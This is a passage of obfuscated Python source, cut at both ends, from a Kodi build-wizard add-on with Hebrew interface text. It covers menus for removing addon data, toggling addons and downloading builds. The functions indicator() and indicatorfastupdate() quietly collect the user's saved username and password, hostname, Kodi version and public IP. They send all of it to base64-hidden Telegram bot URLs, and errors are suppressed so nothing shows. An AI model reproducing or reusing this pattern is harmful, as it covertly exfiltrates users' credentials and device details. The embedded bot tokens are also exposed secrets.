		else :O0O0000OOO0O00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3718
		if O0O0000OOO0O00O0O ==1 :wiz .reloadFix ('remove addon')#line:3719
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3720
def removeAddonDataMenu ():#line:3722
	if os .path .exists (ADDOND ):#line:3723
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3724
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3725
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3726
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3727
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3728
		O0OO00OOO0O0OOO0O =glob .glob (os .path .join (ADDOND ,'*/'))#line:3729
		for O00OO0OO0O0O00000 in sorted (O0OO00OOO0O0OOO0O ,key =lambda O0000O0O0O0O0OOO0 :O0000O0O0O0O0OOO0 ):#line:3730
			OOO000OO00O00O00O =O00OO0OO0O0O00000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3731
			OO00OO0OOO00OO00O =os .path .join (O00OO0OO0O0O00000 .replace (ADDOND ,ADDONS ),'icon.png')#line:3732
			OOOOO0O000000OOO0 =os .path .join (O00OO0OO0O0O00000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3733
			OOO00O00000OOOO0O =OOO000OO00O00O00O #line:3734
			OO0OOOOOOOO0O0OOO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3735
			for OOO0O0O000O0OO00O in OO0OOOOOOOO0O0OOO :#line:3736
				OOO00O00000OOOO0O =OOO00O00000OOOO0O .replace (OOO0O0O000O0OO00O ,OO0OOOOOOOO0O0OOO [OOO0O0O000O0OO00O ])#line:3737
			if OOO000OO00O00O00O in EXCLUDES :OOO00O00000OOOO0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOO00O00000OOOO0O #line:3738
			else :OOO00O00000OOOO0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOO00O00000OOOO0O #line:3739
			addFile (' %s'%OOO00O00000OOOO0O ,'removedata',OOO000OO00O00O00O ,icon =OO00OO0OOO00OO00O ,fanart =OOOOO0O000000OOO0 ,themeit =THEME2 )#line:3740
	else :#line:3741
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3742
	setView ('files','viewType')#line:3743
def enableAddons ():#line:3745
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3746
	O0O0OOO000O0O00O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3747
	OO0O0O0OOO00000O0 =0 #line:3748
	for O00O00OO000OOO00O in sorted (O0O0OOO000O0O00O0 ,key =lambda O00O0OO0O00OOO0OO :O00O0OO0O00OOO0OO ):#line:3749
		O0O0OOO0O0OO00OOO =os .path .split (O00O00OO000OOO00O [:-1 ])[1 ]#line:3750
		if O0O0OOO0O0OO00OOO in EXCLUDES :continue #line:3751
		if O0O0OOO0O0OO00OOO in DEFAULTPLUGINS :continue #line:3752
		OO0O000OOOOO000O0 =os .path .join (O00O00OO000OOO00O ,'addon.xml')#line:3753
		if os .path .exists (OO0O000OOOOO000O0 ):#line:3754
			OO0O0O0OOO00000O0 +=1 #line:3755
			O0O0OOO000O0O00O0 =O00O00OO000OOO00O .replace (ADDONS ,'')[1 :-1 ]#line:3756
			OOOO0OO00OO0OOOOO =open (OO0O000OOOOO000O0 )#line:3757
			OO00O0OOOOO00O0OO =OOOO0OO00OO0OOOOO .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3758
			O0O00OOOOO0O0O000 =wiz .parseDOM (OO00O0OOOOO00O0OO ,'addon',ret ='id')#line:3759
			O00OO000O0O00O0O0 =wiz .parseDOM (OO00O0OOOOO00O0OO ,'addon',ret ='name')#line:3760
			try :#line:3761
				O00OOO00OOO0OO000 =O0O00OOOOO0O0O000 [0 ]#line:3762
				OOO00O00O000O0OOO =O00OO000O0O00O0O0 [0 ]#line:3763
			except :#line:3764
				continue #line:3765
			try :#line:3766
				O0OOOO0OOO0OO0O00 =xbmcaddon .Addon (id =O00OOO00OOO0OO000 )#line:3767
				OOOO0O0OOO000OO0O ="[COLOR green][Enabled][/COLOR]"#line:3768
				OOOO0OOOOOOOO0OOO ="false"#line:3769
			except :#line:3770
				OOOO0O0OOO000OO0O ="[COLOR red][Disabled][/COLOR]"#line:3771
				OOOO0OOOOOOOO0OOO ="true"#line:3772
				pass #line:3773
			OO0000O0000OO0OO0 =os .path .join (O00O00OO000OOO00O ,'icon.png')if os .path .exists (os .path .join (O00O00OO000OOO00O ,'icon.png'))else ICON #line:3774
			O00OO0OO0OO0OOOOO =os .path .join (O00O00OO000OOO00O ,'fanart.jpg')if os .path .exists (os .path .join (O00O00OO000OOO00O ,'fanart.jpg'))else FANART #line:3775
			addFile ("%s %s"%(OOOO0O0OOO000OO0O ,OOO00O00O000O0OOO ),'toggleaddon',O0O0OOO000O0O00O0 ,OOOO0OOOOOOOO0OOO ,icon =OO0000O0000OO0OO0 ,fanart =O00OO0OO0OO0OOOOO )#line:3776
			OOOO0OO00OO0OOOOO .close ()#line:3777
	if OO0O0O0OOO00000O0 ==0 :#line:3778
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3779
	setView ('files','viewType')#line:3780
def changeFeq ():#line:3782
	O00OO000O0000O000 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3783
	O000O0O00O0O0O000 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O00OO000O0000O000 )#line:3784
	if not O000O0O00O0O0O000 ==-1 :#line:3785
		wiz .setS ('autocleanfeq',str (O000O0O00O0O0O000 ))#line:3786
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O00OO000O0000O000 [O000O0O00O0O0O000 ]))#line:3787
def developer ():#line:3789
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3790
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3791
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3792
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3793
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3794
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3795
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3796
	setView ('files','viewType')#line:3798
def download (OO0O00O00O0O00OO0 ,O000O00O0OOOO0OOO ):#line:3803
  O0000OOOOOOOO00O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3804
  O0O0000O00OOOO00O =xbmcgui .DialogProgress ()#line:3805
  O0O0000O00OOOO00O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3806
  OO0O00OO0O000OO00 =os .path .join (O0000OOOOOOOO00O0 ,'isr.zip')#line:3807
  OOO0OOOO00O0OO000 =urllib2 .Request (OO0O00O00O0O00OO0 )#line:3808
  O0O00OOOOOO0OOO00 =urllib2 .urlopen (OOO0OOOO00O0OO000 )#line:3809
  OO0O0O00O000OOO00 =xbmcgui .DialogProgress ()#line:3811
  OO0O0O00O000OOO00 .create ("Downloading","Downloading "+name )#line:3812
  OO0O0O00O000OOO00 .update (0 )#line:3813
  OOO0O0O0O00OOO0OO =O000O00O0OOOO0OOO #line:3814
  O00OO0O0O00OO0O0O =open (OO0O00OO0O000OO00 ,'wb')#line:3815
  try :#line:3817
    O0OO0OO0O000O00OO =O0O00OOOOOO0OOO00 .info ().getheader ('Content-Length').strip ()#line:3818
    O00OOOO0O0O000O00 =True #line:3819
  except AttributeError :#line:3820
        O00OOOO0O0O000O00 =False #line:3821
  if O00OOOO0O0O000O00 :#line:3823
        O0OO0OO0O000O00OO =int (O0OO0OO0O000O00OO )#line:3824
  O0OO0OO0OO0O0OO0O =0 #line:3826
  O00OO0OO000OO0000 =time .time ()#line:3827
  while True :#line:3828
        O0O0000OO0000O00O =O0O00OOOOOO0OOO00 .read (8192 )#line:3829
        if not O0O0000OO0000O00O :#line:3830
            sys .stdout .write ('\n')#line:3831
            break #line:3832
        O0OO0OO0OO0O0OO0O +=len (O0O0000OO0000O00O )#line:3834
        O00OO0O0O00OO0O0O .write (O0O0000OO0000O00O )#line:3835
        if not O00OOOO0O0O000O00 :#line:3837
            O0OO0OO0O000O00OO =O0OO0OO0OO0O0OO0O #line:3838
        if OO0O0O00O000OOO00 .iscanceled ():#line:3839
           OO0O0O00O000OOO00 .close ()#line:3840
           try :#line:3841
            os .remove (OO0O00OO0O000OO00 )#line:3842
           except :#line:3843
            pass #line:3844
           break #line:3845
        OO00OO00O00O0000O =float (O0OO0OO0OO0O0OO0O )/O0OO0OO0O000O00OO #line:3846
        OO00OO00O00O0000O =round (OO00OO00O00O0000O *100 ,2 )#line:3847
        O0O000000O00O0O0O =O0OO0OO0OO0O0OO0O /(1024 *1024 )#line:3848
        O0O00OO00O00OOOO0 =O0OO0OO0O000O00OO /(1024 *1024 )#line:3849
        O0OO0O0OO000O0OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O000000O00O0O0O ,'teal',O0O00OO00O00OOOO0 )#line:3850
        if (time .time ()-O00OO0OO000OO0000 )>0 :#line:3851
          O000OO000000O0OO0 =O0OO0OO0OO0O0OO0O /(time .time ()-O00OO0OO000OO0000 )#line:3852
          O000OO000000O0OO0 =O000OO000000O0OO0 /1024 #line:3853
        else :#line:3854
         O000OO000000O0OO0 =0 #line:3855
        O0OO0O0OO00O0O0O0 ='KB'#line:3856
        if O000OO000000O0OO0 >=1024 :#line:3857
           O000OO000000O0OO0 =O000OO000000O0OO0 /1024 #line:3858
           O0OO0O0OO00O0O0O0 ='MB'#line:3859
        if O000OO000000O0OO0 >0 and not OO00OO00O00O0000O ==100 :#line:3860
            OO0O00OO0000O0O00 =(O0OO0OO0O000O00OO -O0OO0OO0OO0O0OO0O )/O000OO000000O0OO0 #line:3861
        else :#line:3862
            OO0O00OO0000O0O00 =0 #line:3863
        OOO0OOOO00OO000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000OO000000O0OO0 ,O0OO0O0OO00O0O0O0 )#line:3864
        OO0O0O00O000OOO00 .update (int (OO00OO00O00O0000O ),"Downloading "+name ,O0OO0O0OO000O0OOO ,OOO0OOOO00OO000O0 )#line:3866
  OOOOOOO0000O0O0OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3869
  O00OO0O0O00OO0O0O .close ()#line:3871
  extract (OO0O00OO0O000OO00 ,OOOOOOO0000O0O0OO ,OO0O0O00O000OOO00 )#line:3873
  if os .path .exists (OOOOOOO0000O0O0OO +'/scakemyer-script.quasar.burst'):#line:3874
    if os .path .exists (OOOOOOO0000O0O0OO +'/script.quasar.burst'):#line:3875
     shutil .rmtree (OOOOOOO0000O0O0OO +'/script.quasar.burst',ignore_errors =False )#line:3876
    os .rename (OOOOOOO0000O0O0OO +'/scakemyer-script.quasar.burst',OOOOOOO0000O0O0OO +'/script.quasar.burst')#line:3877
  if os .path .exists (OOOOOOO0000O0O0OO +'/plugin.video.kmediatorrent-master'):#line:3879
    if os .path .exists (OOOOOOO0000O0O0OO +'/plugin.video.kmediatorrent'):#line:3880
     shutil .rmtree (OOOOOOO0000O0O0OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3881
    os .rename (OOOOOOO0000O0O0OO +'/plugin.video.kmediatorrent-master',OOOOOOO0000O0O0OO +'/plugin.video.kmediatorrent')#line:3882
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3883
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3884
  try :#line:3885
    os .remove (OO0O00OO0O000OO00 )#line:3886
  except :#line:3887
    pass #line:3888
  OO0O0O00O000OOO00 .close ()#line:3889
def dis_or_enable_addon (O0OOOOO0O000000OO ,OOOO0OO00OOOOO0OO ,enable ="true"):#line:3890
    import json #line:3891
    O0O0O0OOOOO0O0000 ='"%s"'%O0OOOOO0O000000OO #line:3892
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOOO0O000000OO )and enable =="true":#line:3893
        logging .warning ('already Enabled')#line:3894
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OOOOO0O000000OO )#line:3895
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOOO0O000000OO )and enable =="false":#line:3896
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OOOOO0O000000OO )#line:3897
    else :#line:3898
        O0000O0O00O00OOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O0O0OOOOO0O0000 ,enable )#line:3899
        O0O00O0OOO0OOO000 =xbmc .executeJSONRPC (O0000O0O00O00OOOO )#line:3900
        OOO0O00OOO00OO000 =json .loads (O0O00O0OOO0OOO000 )#line:3901
        if enable =="true":#line:3902
            xbmc .log ("### Enabled %s, response = %s"%(O0OOOOO0O000000OO ,OOO0O00OOO00OO000 ))#line:3903
        else :#line:3904
            xbmc .log ("### Disabled %s, response = %s"%(O0OOOOO0O000000OO ,OOO0O00OOO00OO000 ))#line:3905
    if OOOO0OO00OOOOO0OO =='auto':#line:3906
     return True #line:3907
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3908
def chunk_report (O0OOO0O0OO0O0OO0O ,OOOOO000O0OO0O0O0 ,OOOO0O0O0000O0O0O ):#line:3909
   OO00O00O000OOO0O0 =float (O0OOO0O0OO0O0OO0O )/OOOO0O0O0000O0O0O #line:3910
   OO00O00O000OOO0O0 =round (OO00O00O000OOO0O0 *100 ,2 )#line:3911
   if O0OOO0O0OO0O0OO0O >=OOOO0O0O0000O0O0O :#line:3913
      sys .stdout .write ('\n')#line:3914
def chunk_read (O00O0OOOO0O0OOOOO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3916
   import time #line:3917
   OOOO0OO0OOO000O0O =int (filesize )*1000000 #line:3918
   OO0O0O0O0O0O00OO0 =0 #line:3920
   O00OO000O0OO0OO00 =time .time ()#line:3921
   OOO00000O0OOO0O00 =0 #line:3922
   logging .warning ('Downloading')#line:3924
   with open (destination ,"wb")as O0OO0OOOO0000O00O :#line:3925
    while 1 :#line:3926
      OOO0OO000O0OOO00O =time .time ()-O00OO000O0OO0OO00 #line:3927
      O00O0OOOOO0O0O0O0 =int (OOO00000O0OOO0O00 *chunk_size )#line:3928
      O0O000OOO0OOO000O =O00O0OOOO0O0OOOOO .read (chunk_size )#line:3929
      O0OO0OOOO0000O00O .write (O0O000OOO0OOO000O )#line:3930
      O0OO0OOOO0000O00O .flush ()#line:3931
      OO0O0O0O0O0O00OO0 +=len (O0O000OOO0OOO000O )#line:3932
      O0000OO0O0000O0O0 =float (OO0O0O0O0O0O00OO0 )/OOOO0OO0OOO000O0O #line:3933
      O0000OO0O0000O0O0 =round (O0000OO0O0000O0O0 *100 ,2 )#line:3934
      if int (OOO0OO000O0OOO00O )>0 :#line:3935
        OOOO00OO0O0000O0O =int (O00O0OOOOO0O0O0O0 /(1024 *OOO0OO000O0OOO00O ))#line:3936
      else :#line:3937
         OOOO00OO0O0000O0O =0 #line:3938
      if OOOO00OO0O0000O0O >1024 and not O0000OO0O0000O0O0 ==100 :#line:3939
          O00000OOOOOOO000O =int (((OOOO0OO0OOO000O0O -O00O0OOOOO0O0O0O0 )/1024 )/(OOOO00OO0O0000O0O ))#line:3940
      else :#line:3941
          O00000OOOOOOO000O =0 #line:3942
      if O00000OOOOOOO000O <0 :#line:3943
        O00000OOOOOOO000O =0 #line:3944
      dp .update (int (O0000OO0O0000O0O0 ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0000OO0O0000O0O0 ,O00O0OOOOO0O0O0O0 /(1024 *1024 ),OOOO0OO0OOO000O0O /(1000 *1000 ),OOOO00OO0O0000O0O ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O00000OOOOOOO000O ,60 ))#line:3945
      if dp .iscanceled ():#line:3946
         dp .close ()#line:3947
         break #line:3948
      if not O0O000OOO0OOO000O :#line:3949
         break #line:3950
      if report_hook :#line:3952
         report_hook (OO0O0O0O0O0O00OO0 ,chunk_size ,OOOO0OO0OOO000O0O )#line:3953
      OOO00000O0OOO0O00 +=1 #line:3954
   logging .warning ('END Downloading')#line:3955
   return OO0O0O0O0O0O00OO0 #line:3956
def googledrive_download (O0OOOO000O00OO0O0 ,OO00000OO0OOOO00O ,OOOOO0O0O00OO00OO ,OOO0OO0000O0O00O0 ):#line:3958
    OO000OO00OO0O0O00 =[]#line:3962
    OOO000O0O0O000000 =O0OOOO000O00OO0O0 .split ('=')#line:3963
    O0OOOO000O00OO0O0 =OOO000O0O0O000000 [len (OOO000O0O0O000000 )-1 ]#line:3964
    def OOO0OO0O0O00O0000 (OO00000OOO0OOO000 ):#line:3966
        for OO000O00O00O0O00O in OO00000OOO0OOO000 :#line:3968
            logging .warning ('cookie.name')#line:3969
            logging .warning (OO000O00O00O0O00O .name )#line:3970
            O0O000000O0OO0O0O =OO000O00O00O0O00O .value #line:3971
            if 'download_warning'in OO000O00O00O0O00O .name :#line:3972
                logging .warning (OO000O00O00O0O00O .value )#line:3973
                logging .warning ('cookie.value')#line:3974
                return OO000O00O00O0O00O .value #line:3975
            return O0O000000O0OO0O0O #line:3976
        return None #line:3978
    def O0OO0OOOOOO00OOOO (OOOO0O0OO0O0O0000 ,OOOO0O0000O0O00O0 ):#line:3980
        O0OO0O00000OOO00O =32768 #line:3982
        OO00OOO000OO0OOO0 =time .time ()#line:3983
        with open (OOOO0O0000O0O00O0 ,"wb")as O00OO0O00O00OO000 :#line:3985
            OO000OO0O0OO0O00O =1 #line:3986
            O00OOOOOO0O0OO000 =32768 #line:3987
            try :#line:3988
                OOO000000OO0OOO0O =int (OOOO0O0OO0O0O0000 .headers .get ('content-length'))#line:3989
                print ('file total size :',OOO000000OO0OOO0O )#line:3990
            except TypeError :#line:3991
                print ('using dummy length !!!')#line:3992
                OOO000000OO0OOO0O =int (OOO0OO0000O0O00O0 )*1000000 #line:3993
            for O0OO0OO0O0O0OOO00 in OOOO0O0OO0O0O0000 .iter_content (O0OO0O00000OOO00O ):#line:3994
                if O0OO0OO0O0O0OOO00 :#line:3995
                    O00OO0O00O00OO000 .write (O0OO0OO0O0O0OOO00 )#line:3996
                    O00OO0O00O00OO000 .flush ()#line:3997
                    O000000OO00O000OO =time .time ()-OO00OOO000OO0OOO0 #line:3998
                    O0O00O0O0O0O0O0OO =int (OO000OO0O0OO0O00O *O00OOOOOO0O0OO000 )#line:3999
                    if O000000OO00O000OO ==0 :#line:4000
                        O000000OO00O000OO =0.1 #line:4001
                    O00O00O000000O00O =int (O0O00O0O0O0O0O0OO /(1024 *O000000OO00O000OO ))#line:4002
                    O000O00OO00O00O00 =int (OO000OO0O0OO0O00O *O00OOOOOO0O0OO000 *100 /OOO000000OO0OOO0O )#line:4003
                    if O00O00O000000O00O >1024 and not O000O00OO00O00O00 ==100 :#line:4004
                      OOOO00OOO0O00O0OO =int (((OOO000000OO0OOO0O -O0O00O0O0O0O0O0OO )/1024 )/(O00O00O000000O00O ))#line:4005
                    else :#line:4006
                      OOOO00OOO0O00O0OO =0 #line:4007
                    OOOOO0O0O00OO00OO .update (int (O000O00OO00O00O00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O000O00OO00O00O00 ,O0O00O0O0O0O0O0OO /(1024 *1024 ),OOO000000OO0OOO0O /(1000 *1000 ),O00O00O000000O00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOO00OOO0O00O0OO ,60 ))#line:4009
                    OO000OO0O0OO0O00O +=1 #line:4010
                    if OOOOO0O0O00OO00OO .iscanceled ():#line:4011
                     OOOOO0O0O00OO00OO .close ()#line:4012
                     break #line:4013
    OO0O0O0O000OOO0O0 ="https://docs.google.com/uc?export=download"#line:4014
    import urllib2 #line:4019
    import cookielib #line:4020
    from cookielib import CookieJar #line:4022
    OO0O0OOO0OOO0O0OO =CookieJar ()#line:4024
    O000O00O0OO0OO000 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO0O0OOO0OOO0O0OO ))#line:4025
    O0O0OOOO000OO0OO0 ={'id':O0OOOO000O00OO0O0 }#line:4027
    OO0OO0OOO0OO0OO00 =urllib .urlencode (O0O0OOOO000OO0OO0 )#line:4028
    logging .warning (OO0O0O0O000OOO0O0 +'&'+OO0OO0OOO0OO0OO00 )#line:4029
    O00OOO00O000O00O0 =O000O00O0OO0OO000 .open (OO0O0O0O000OOO0O0 +'&'+OO0OO0OOO0OO0OO00 )#line:4030
    O00OOOO0O00OO0000 =O00OOO00O000O00O0 .read ()#line:4031
    for OOO0O0OO0O0O000O0 in OO0O0OOO0OOO0O0OO :#line:4033
         logging .warning (OOO0O0OO0O0O000O0 )#line:4034
    O0000O0O0O000O0O0 =OOO0OO0O0O00O0000 (OO0O0OOO0OOO0O0OO )#line:4035
    logging .warning (O0000O0O0O000O0O0 )#line:4036
    if O0000O0O0O000O0O0 :#line:4037
        OOO000OOOOOO00000 ={'id':O0OOOO000O00OO0O0 ,'confirm':O0000O0O0O000O0O0 }#line:4038
        OO00OOO0OO00OOOOO ={'Access-Control-Allow-Headers':'Content-Length'}#line:4039
        OO0OO0OOO0OO0OO00 =urllib .urlencode (OOO000OOOOOO00000 )#line:4040
        O00OOO00O000O00O0 =O000O00O0OO0OO000 .open (OO0O0O0O000OOO0O0 +'&'+OO0OO0OOO0OO0OO00 )#line:4041
        chunk_read (O00OOO00O000O00O0 ,report_hook =chunk_report ,dp =OOOOO0O0O00OO00OO ,destination =OO00000OO0OOOO00O ,filesize =OOO0OO0000O0O00O0 )#line:4042
    return (OO000OO00OO0O0O00 )#line:4046
def kodi17Fix ():#line:4047
	OOOO00OOOO00OOO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:4048
	O000OO0O0OO0O0000 =[]#line:4049
	for OO0OO000O00OOO0O0 in sorted (OOOO00OOOO00OOO0O ,key =lambda O00000000OO0O0O00 :O00000000OO0O0O00 ):#line:4050
		OO00O0000O00O0O00 =os .path .join (OO0OO000O00OOO0O0 ,'addon.xml')#line:4051
		if os .path .exists (OO00O0000O00O0O00 ):#line:4052
			OOO00OO0OOOO0O00O =OO0OO000O00OOO0O0 .replace (ADDONS ,'')[1 :-1 ]#line:4053
			OO00OO0O00O0OOOOO =open (OO00O0000O00O0O00 )#line:4054
			O000OOO0O0O0000O0 =OO00OO0O00O0OOOOO .read ()#line:4055
			O0000OOOO0OO0OO00 =parseDOM (O000OOO0O0O0000O0 ,'addon',ret ='id')#line:4056
			OO00OO0O00O0OOOOO .close ()#line:4057
			try :#line:4058
				OO0000O0OOO000OO0 =xbmcaddon .Addon (id =O0000OOOO0OO0OO00 [0 ])#line:4059
			except :#line:4060
				try :#line:4061
					log ("%s was disabled"%O0000OOOO0OO0OO00 [0 ],xbmc .LOGDEBUG )#line:4062
					O000OO0O0OO0O0000 .append (O0000OOOO0OO0OO00 [0 ])#line:4063
				except :#line:4064
					try :#line:4065
						log ("%s was disabled"%OOO00OO0OOOO0O00O ,xbmc .LOGDEBUG )#line:4066
						O000OO0O0OO0O0000 .append (OOO00OO0OOOO0O00O )#line:4067
					except :#line:4068
						if len (O0000OOOO0OO0OO00 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OOO00OO0OOOO0O00O ,xbmc .LOGERROR )#line:4069
						else :log ("Unabled to enable: %s"%OO0OO000O00OOO0O0 ,xbmc .LOGERROR )#line:4070
	if len (O000OO0O0OO0O0000 )>0 :#line:4071
		O000OO0O0000O0OO0 =0 #line:4072
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:4073
		for OOOO0OOO0OOOOOO00 in O000OO0O0OO0O0000 :#line:4074
			O000OO0O0000O0OO0 +=1 #line:4075
			OO0000OOO00OO0OO0 =int (percentage (O000OO0O0000O0OO0 ,len (O000OO0O0OO0O0000 )))#line:4076
			DP .update (OO0000OOO00OO0OO0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOO0OOOOOO00 ))#line:4077
			addonDatabase (OOOO0OOO0OOOOOO00 ,1 )#line:4078
			if DP .iscanceled ():break #line:4079
		if DP .iscanceled ():#line:4080
			DP .close ()#line:4081
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:4082
			sys .exit ()#line:4083
		DP .close ()#line:4084
	forceUpdate ()#line:4085
def indicator ():#line:4087
       try :#line:4088
          import json #line:4089
          wiz .log ('FRESH MESSAGE')#line:4090
          O0OOOOOO0OO000O0O =(ADDON .getSetting ("user"))#line:4091
          OO0O00OOO0O000O00 =(ADDON .getSetting ("pass"))#line:4092
          O0OOO000O0O0OOO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4093
          OO000000000O0O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:4094
          OOOO00000OOOOOO0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4095
          O0OOO00O000OOO0OO =str (json .loads (OOOO00000OOOOOO0O )['ip'])#line:4096
          O0O0000O00OOOO0OO =O0OOOOOO0OO000O0O #line:4097
          OO0OO00OO0OO00O0O =OO0O00OOO0O000O00 #line:4098
          import socket #line:4099
          OOOO00000OOOOOO0O =urllib2 .urlopen (OO000000000O0O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0000O00OOOO0OO +' - '+OO0OO00OO0OO00O0O +' - '+O0OOO000O0O0OOO0O +' - '+O0OOO00O000OOO0OO ).readlines ()#line:4100
       except :pass #line:4102
def indicatorfastupdate ():#line:4104
       try :#line:4105
          import json #line:4106
          wiz .log ('FRESH MESSAGE')#line:4107
          OOO00OOO0OOOO0OO0 =(ADDON .getSetting ("user"))#line:4108
          O00OO0000OOO0O0O0 =(ADDON .getSetting ("pass"))#line:4109
          OOO00O0OO00OO0OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4110
          OOOOO0OOO0O0OOOO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:4112
          OOO0OOOO00OO00000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4113
          O00O0OOOO0O00O000 =str (json .loads (OOO0OOOO00OO00000 )['ip'])#line:4114
          O00OOO00O0O0O00OO =OOO00OOO0OOOO0OO0 #line:4115
          O0OO0O000OOOOOOO0 =O00OO0000OOO0O0O0 #line:4116
          import socket #line:4118
          OOO0OOOO00OO00000 =urllib2 .urlopen (OOOOO0OOO0O0OOOO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00OOO00O0O0O00OO +' - '+O0OO0O000OOOOOOO0 +' - '+OOO00O0OO00OO0OO0 +' - '+O00O0OOOO0O00O000 ).readlines ()#line:4119
       except :pass #line:4121
def skinfix18 ():#line:4123
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:4124
		OOO0OOOOO0000OOOO =wiz .workingURL (SKINID18DDONXML )#line:4125
		if OOO0OOOOO0000OOOO ==True :#line:4126
			OO0O00OOO0OOO00O0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:4127
